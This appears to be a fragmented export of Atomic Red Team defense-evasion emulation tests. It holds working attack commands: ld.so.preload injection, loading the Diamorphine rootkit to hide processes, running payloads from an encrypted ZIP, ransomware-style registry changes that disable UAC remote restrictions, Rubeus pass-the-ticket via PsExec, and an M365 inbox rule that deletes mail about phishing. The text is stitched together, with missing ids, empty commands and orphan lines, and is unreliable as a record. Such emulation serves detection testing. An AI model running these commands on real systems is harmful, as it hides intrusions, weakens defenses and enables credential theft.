scripts.command:
echo #{art_evasion_1014_library_path} | tee -a /etc/ld.so.preload
/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo "process hidden"

scripts.id: ART - T1014 - Loadable Kernel Module based Rootkit (Diamorphine)
scripts.name: ART - T1014 - Loadable Kernel Module based Rootkit (Diamorphine)
scripts.description: Loads Diamorphine kernel module, which hides itself and a processes.
scripts.command:
sudo modprobe #{art_evasion_1014_rootkit_name}
ping -c 10 localhost >/dev/null & TARGETPID="$!"
ps $TARGETPID
kill -31 $TARGETPID
ps $TARGETPID || echo "process ${TARGETPID} hidden"
scripts.cleanup_command:
kill -63 1
sudo modprobe -r #{art_evasion_1014_rootkit_name}
sudo rm -rf /lib/modules/$(uname -r)/#{art_evasion_1014_rootkit_name}.ko /tmp/atomic
sudo depmod -a
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.id: ART - T1027 - Decode base64 Data into Script
scripts.name: ART - T1027 - Decode base64 Data into Script
scripts.description:
Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` 
and uname -v
scripts.command:
if [ "$(uname)" = 'FreeBSD' ]; then cmd="b64decode -r"; else cmd="base64 -d"; fi;
cat /tmp/encoded.dat | $cmd > /tmp/art.sh
chmod +x /tmp/art.sh
/tmp/art.sh

scripts.id: ART - T1027.013 - Password-Protected ZIP Payload Extraction and Execution
scripts.name: ART - T1027.013 - Password-Protected ZIP Payload Extraction and Execution
scripts.description:
Extracts and executes a script from a password-protected ZIP archive.
This technique is commonly used by malware families like Emotet and QBot to deliver payloads
via email attachments where the password is provided in the message body.
The encrypted ZIP evades static file analysis until extracte...
scripts.technique_name: Password-Protected ZIP Payload Extraction and Execution
scripts.command:
echo '#!/bin/bash' > /tmp/art_payload.sh
echo 'echo "T1027.013: Payload extracted from encrypted ZIP"' >> /tmp/art_payload.sh
echo 'echo "Hostname: $(hostname)"' >> /tmp/art_payload.sh
echo 'echo "User: $(whoami)"' >> /tmp/art_payload.sh
echo 'uname -a' >> /tmp/art_payload.sh
cd /tmp && zip -P "#{art_evasion_1027_013_zip_password}" art_encrypted.zip art_payload.sh
rm /tmp/art_payload.sh
echo "Encrypted ZIP created. Extracting with password..."
unzip -P "#{art_evasion_1027_013_zip_password}" -o /tmp/art_encrypted.zip -d /tmp/
echo "Executing extracted payload:"
bash /tmp/art_payload.sh
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.name: ART - T1027.018 - File Masquerading with Zero-Width Space
scripts.description:

scripts.id: ART - T1112 - BlackByte Ransomware Registry Changes - CMD
scripts.name: ART - T1112 - BlackByte Ransomware Registry Changes - CMD
scripts.description:
This task recreates the steps taken by BlackByte ransomware before it worms to other machines. See "Preparing to Worm" section: https://redcanary.com/blog/blackbyte-ransomware/ The steps are as follows:
  1. 1. Elevate Local Privilege by disabling UAC Remote Restrictions
  2. 2. ...
scripts.command:
cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f
cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f
scripts.cleanup_command:
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v LocalAccountTokenFilterPolicy /f >nul 2>&1
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLinkedConnections /f >nul 2>&1
reg delete HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\ /v LongPathsEnabled /f >nul 2>&1
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.id: ART - T1112 - BlackByte Ransomware Registry Changes - Powershell
scripts.name: ART - T1112 - BlackByte Ransomware Registry Changes - Powershell
scripts.description:
This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See "Preparing to Worm" section: https://redcanary.com/blog/blackbyte-ransomware/
The steps are as follows:
<ol>
    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</...
scripts.command:
New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force
New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force
New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force
scripts.cleanup_command:
Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Force -ErrorAction Ignore
Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLinkedConnections -Force -ErrorAction Ignore
Remove-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled -Force -ErrorAction Ignore
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)

Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it

scripts.id: ART - T1218.004 - InstallUtil evasive invocation
scripts.name: ART - T1218.004 - InstallUtil evasive invocation
scripts.description:
Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, "Running a transacted installation."
will be displayed, along with other information about the opperation. "The transacted install has completed." will be displayed upo...
scripts.command:
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. "#{art_evasion_1218_004_test_harness}"

$InstallerAssemblyDir = "$Env:windir\System32\Tasks"
$InstallerAssemblyFileName = 'readme.txt'
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "readme.txt"
$ExpectedOutput = 'Constructor_'

# Explicitly set the directory so that a relative path to readme.txt can be supplied.
Set-Location "$Env:windir\System32\Tasks"

Copy-Item -Path "$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe" -Destination "$Env:windir\System32\Tasks\notepad.exe"

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = 'Executable'
    CommandLine = $CommandLine
    InstallUtilPath = "$Env:windir\System32\Tasks\notepad.exe"
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
scripts.cleanup_command:
Remove-Item -Path "$Env:windir\System32\Tasks\readme.txt" -ErrorAction Ignore
Remove-Item -Path "$Env:windir\System32\Tasks\readme.InstallLog" -ErrorAction Ignore
Remove-Item -Path "$Env:windir\System32\Tasks\readme.InstallState" -ErrorAction Ignore
Remove-Item -Path "$Env:windir\System32\Tasks\notepad.exe" -ErrorAction Ignore

[reference](https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/)
scripts.technique_name: Enable Local and Remote Symbolic Links via fsutil
scripts.command:

scripts.cleanup_command:

scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.id: ART - T1222 - Enable Local and Remote Symbolic Links via reg.exe

Use reg.exe to enable both ‘remote to local’ and ‘remote to remote’ symbolic links. This allows access to files from local shortcuts with local or remote paths.
[reference](https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/)
scripts.technique_name: Enable Local and Remote Symbolic Links via reg.exe
scripts.command:
reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d "1" /f
scripts.cleanup_command:
reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d "0" /f
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.id: ART - T1222 - Enable Local and Remote Symbolic Links via Powershell

[reference](https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/)
scripts.technique_name: Enable Local and Remote Symbolic Links via Powershell
scripts.command:
New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore
New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore
scripts.cleanup_command:

scripts.id: ART - T1497.001 - Detect Virtualization Environment using sysctl (hw.model)
scripts.name: ART - T1497.001 - Detect Virtualization Environment using sysctl (hw.model)
scripts.description:

but will return the hypervisor name (VMware7,0).
Reference: https://evasions.checkpoint.com/src/MacOS/macos.html#hardware-model
scripts.command: if [ "$(sysctl -n hw.model | grep -v 'Mac')" != "" ]; then echo 'Virtualization Environment detected'; fi;
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.id: ART - T1497.001 - Check if System Integrity Protection is enabled
scripts.name: ART - T1497.001 - Check if System Integrity Protection is enabled
scripts.description:
The latest versions of macOS have the System Integrity Protection feature (SIP). If a sandbox uses a non-signed 
kernel extension for monitoring purposes the, SIP feature must be disabled to load this kind of kernel extension.
Malware may check if the SIP is enabled.
Reference: https://evasions.c...
scripts.technique_name: Check if System Integrity Protection is enabled
scripts.command: if [ "$(csrutil status | grep -v 'enabled')" != "" ]; then echo 'Possible Virtualization Environment detected'; fi;
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.id: ART - T1497.001 - Detect Virtualization Environment using system_profiler
scripts.name: ART - T1497.001 - Detect Virtualization Environment using system_profiler
scripts.description:
system_profiler provides system hardware and software configuration and the Model Identifier should provide the value similar to (sysctl -n hw.model). 
We should be able to find whether virtualization is enabled by checking whether the Model Identifier does not contain "Mac".
scripts.command: if [ "$(system_profiler SPHardwareDataType | grep "Model Identifier" | grep -v 'Mac')" != "" ]; then echo 'Virtualization Environment detected'; fi;
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.id: ART - T1550.003 - Rubeus Kerberos Pass The Ticket
scripts.name: ART - T1550.003 - Rubeus Kerberos Pass The Ticket
scripts.description:
Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).
PsExec is used to execute commands on the remote system, and the...
scripts.command:
& "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -accepteula \\#{art_evasion_1550_003_target} -w c:\ -c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgt /user:#{art_evasion_1550_003_user_name} /password:#{art_evasion_1550_003_password} /domain:#{art_evasion_1550_003_domain} /outfile:ticket.kirbi
Set-Location "PathToAtomicsFolder\..\ExternalPayloads"
Move-Item -Force "\\#{art_evasion_1550_003_target}\c$\ticket.kirbi" ticket.kirbi
Write-Host "Successfully retrieved TGT from '#{art_evasion_1550_003_target}', now requesting a TGS from local"
& "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgs /service:cifs/#{art_evasion_1550_003_target} /ticket:ticket.kirbi /ptt
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\ticket.kirbi"
& "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" purge
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.id: ART - T1564.008 - New-Inbox Rule to Hide E-mail in M365
scripts.name: ART - T1564.008 - New-Inbox Rule to Hide E-mail in M365
scripts.description:
This test simulates a user adding an inbox rule in M365 to delete emails with specific keywords in email subject or body.
 Reference: https://www.mandiant.com/sites/default/files/2021-09/rpt-fin4.pdf
scripts.technique_name: New-Inbox Rule to Hide E-mail in M365
scripts.command:
Import-Module ExchangeOnlineManagement
$password = ConvertTo-SecureString -String "#{art_evasion_1564_008_auth_password}" -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{art_evasion_1564_008_auth_username}", $password
Connect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue
New-InboxRule -Mailbox #{art_evasion_1564_008_target_mailbox} -Name #{art_evasion_1564_008_mail_rulename} -SubjectOrBodyContainsWords ("phish","malware","hacked") -Confirm:$false -DeleteMessage:$true
scripts.cleanup_command:
Import-Module ExchangeOnlineManagement
$password = ConvertTo-SecureString -String "#{art_evasion_1564_008_auth_password}" -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{art_evasion_1564_008_auth_username}", $password
Connect-ExchangeOnline -Credential $credential
Remove-InboxRule -Mailbox #{art_evasion_1564_008_target_mailbox} -Identity #{art_evasion_1564_008_mail_rulename} -Confirm:$false
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.description:

SNAPSHOT_ID=$(aws ec2 describe-snapshots --region #{art_evasion_1578_001_aws_region} --filters "Name=volume-id,Values=#{art_evasion_1578_001_aws_volume_id}" --query "Snapshots[0].SnapshotId" --output text)

scripts.id: ART - T1578.002 - Create EC2 Instance from Launch Template
scripts.name: ART - T1578.002 - Create EC2 Instance from Launch Template
scripts.description:
Creating and launching an instance using RunInstances, with a launch template.
This launch template will contain all the necessary parameters for the instance.

Reference for the launch templates
https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/create-launch-template.html

scripts.technique_name: Create EC2 Instance from Launch Template
scripts.command:
aws ec2 create-launch-template \
  --launch-template-name #{art_evasion_1578_002_template_name} \
  --version-description #{art_evasion_1578_002_version} \
  --tag-specifications 'ResourceType=launch-template,Tags=[{Key=purpose,Value=production}]' \

scripts.id: ART - T1578.002 - Create EC2 Instance with user data
scripts.name: ART - T1578.002 - Create EC2 Instance with user data
scripts.description:
Creates an EC2 instance with a keypair while passing user data in a script.
The script runs at launch.
scripts.technique_name: Create EC2 Instance with user data
scripts.command:
printf '%s\n' '#!/bin/bash' 'date -u > /var/tmp/userdata-ran.txt' > my_script.txt
aws ec2 run-instances \
  --image-id #{art_evasion_1578_002_ami_id} \
  --instance-type #{art_evasion_1578_002_instance_type} \
  --count 1 \
  --subnet-id subnet-XXXXXXXXXXXXXXX \
  --key-name MyKeyPair \
  --user-data file://my_script.txt
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.id: ART - T1610 - Deploy Docker container
scripts.name: ART - T1610 - Deploy Docker container
scripts.description: Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime. They can do this using docker create and docker start commands. Kinsing & Doki was exploited using this technique.
scripts.command:
docker build -t t1610 $PathtoAtomicsFolder/T1610/src/
docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh
scripts.cleanup_command:
docker stop t1610_container
docker rmi -f t1610:latest
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.name: ART - T1612 - Build Image On Host
scripts.description: Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and...
scripts.command:
docker build -t t1612  $PathtoAtomicsFolder/T1612/src/
docker run --name t1612_container --rm -d -t t1612
docker exec t1612_container ./test.sh
scripts.cleanup_command:
docker stop t1612_container
docker rmi -f t1612
scripts.detection_rule: See MITRE ATT&CK page for detection guidance

scripts.command:
# Check for common debugger processes
$debuggerProcesses = Get-Process | Where-Object { $_.ProcessName -match "dbg" -or $_.ProcessName -match "debug" }
